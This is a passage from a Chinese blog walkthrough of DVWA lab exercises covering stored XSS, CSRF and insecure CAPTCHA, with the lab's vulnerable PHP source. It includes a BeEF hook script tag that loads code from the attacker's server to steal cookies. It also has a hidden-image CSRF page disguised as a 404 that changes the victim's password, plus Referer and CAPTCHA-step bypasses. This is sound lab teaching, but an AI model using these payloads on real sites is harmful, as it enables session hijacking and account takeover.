class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$message</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$name</span>); </span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>name和message都用htmlspecialchars()规定了，所以不能在这攻击了。</p>
<h2 id="4-8-自动化XSS"><a href="#4-8-自动化XSS" class="headerlink" title="4.8 自动化XSS"></a>4.8 自动化XSS</h2><p><strong>BeEF</strong></p>
<p>启动Apache和BeEF：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">cd /usr/share/beef-xss</span><br><span class="line">./beef</span><br></pre></td></tr></table></figure>
<p>启动BeEF会自动生成代码和服务器。账号密码保存在/etc/beef-xss/config.yaml</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">cd /usr/share/beef-xss</span><br><span class="line">./beef</span><br><span class="line">//脚本利用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.193.128:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//BeEF网站</span><br><span class="line">http://192.168.193.128:3000/ui/panel</span><br><span class="line">//监听端口</span><br><span class="line">ss -tnlp</span><br></pre></td></tr></table></figure>
<p>用户点进XSS存储型后几乎不会发觉木马，BeEF除了能拿到用户的cookie还能实行很多功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令颜色</span><br><span class="line">绿色 对目标主机生效并且不可见(不会被发现)</span><br><span class="line">灰色 对目标主机未必生效(可验证一下)</span><br><span class="line">橙色 对目标主机生效但可能可见(可能被发现)</span><br><span class="line">红色 对目标主机不生效</span><br></pre></td></tr></table></figure>
<h1 id="5-CSRF-跨站请求伪造"><a href="#5-CSRF-跨站请求伪造" class="headerlink" title="5. CSRF(跨站请求伪造)"></a>5. CSRF(跨站请求伪造)</h1><p>CSRF是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
<p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 </p>
<h2 id="5-1-CSRF-低"><a href="#5-1-CSRF-低" class="headerlink" title="5.1 CSRF[低]"></a>5.1 CSRF[低]</h2><p> 查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Change&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Turn requests into variables</span></span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;        </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>&#123;        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这个修改密码竟然是$_GET请求，说明密码会在url上显示。如果用户点击以下链接，他的密码就会改成123。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#</span><br></pre></td></tr></table></figure>
<p>可以用短链接的方法隐藏真实的URL，这样就不容易从链接上看出来修改了密码。</p>
<p>也可以制造一个攻击页面。在本机做一个页面getf.html处理</p>
<p>Getf.html页面代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">0</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>not found<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把上面链接放在公网某个地址，当用户点击这个链接后，客户可能以为访问了一个失效页面，这样就神不知鬼不觉地修改了用户密码。</p>
<h2 id="5-2-CSRF-中"><a href="#5-2-CSRF-中" class="headerlink" title="5.2 CSRF[中]"></a>5.2 CSRF[中]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Change&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Checks the http referer header</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="title function_ invoke__">eregi</span> ( <span class="string">&quot;127.0.0.1&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Turn requests into variables</span></span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">            <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>)&#123;</span><br><span class="line">                <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">                <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">                <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                        </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;        </span><br><span class="line">                <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">else</span>&#123;        </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。源码意思是验证HTTP_REFERER是否是127.0.0.1，判断请求的来源是否是本机，可以通过Burp Suite抓包，然后修改Reffer的值，只要包含127.0.0.1就可以实现修改，甚至可以只是127.0.0.1这个值。</p>
<h2 id="5-3-CSRF-高"><a href="#5-3-CSRF-高" class="headerlink" title="5.3 CSRF[高]"></a>5.3 CSRF[高]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Change&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Turn requests into variables</span></span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_current&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitise current password input</span></span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$qry</span> = <span class="string">&quot;SELECT password FROM `users` WHERE user=&#x27;admin&#x27; AND password=&#x27;<span class="subst">$pass_curr</span>&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$qry</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ))&#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;        </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>&#123;        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这个在修改密码前要输入原密码，如果不知道原密码，就不能搞了。</p>
<h1 id="6-CAPTCHA"><a href="#6-CAPTCHA" class="headerlink" title="6. CAPTCHA"></a>6. CAPTCHA</h1><h2 id="6-1-不安全验证码-低"><a href="#6-1-不安全验证码-低" class="headerlink" title="6.1 不安全验证码[低]"></a>6.1 不安全验证码[低]</h2><p>CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。 简单来说是验证码的意思。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reCAPTCHA API key NULL in config file.</span><br><span class="line"></span><br><span class="line">Please register for a key from reCAPTCHA at [https://www.google.com/recaptcha/admin/create](http://hiderefer.com/?https://www.google.com/recaptcha/admin/create) and set the key in the file /owaspbwa/dvwa-svn/config/config.inc.php    </span><br></pre></td></tr></table></figure>
<p>进入这个页面要很长时间，我猜是因为它去访问谷歌拿验证码了。它说要去 <a target="_blank" rel="noopener" href="http://hiderefer.com/?https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a> 注册密钥再把它放进服务器目录 /owaspbwa/dvwa-svn/config/config.inc.php 里。由于没有科学上网，我就不弄了。</p>
<p>先来看下源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$resp</span>-&gt;is_valid) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes. &lt;br /&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_new</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_conf</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&quot;</span>;</span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Both passwords must match &lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;2&#x27;</span> ) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_new</span> != <span class="variable">$pass_conf</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Both passwords must match&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">               <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">               <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;</span><br><span class="line">               <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>很清楚看到，整个修改密码过程分为两步，第一步是验证验证码是否正确，第二步是修改密码。我们可以通过抓包直接将step修改为2跳过验证。</p>
<h2 id="6-2-不安全验证码-中"><a href="#6-2-不安全验证码-中" class="headerlink" title="6.2 不安全验证码[中]"></a>6.2 不安全验证码[中]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(<span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$resp</span>-&gt;is_valid) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;    </span><br><span 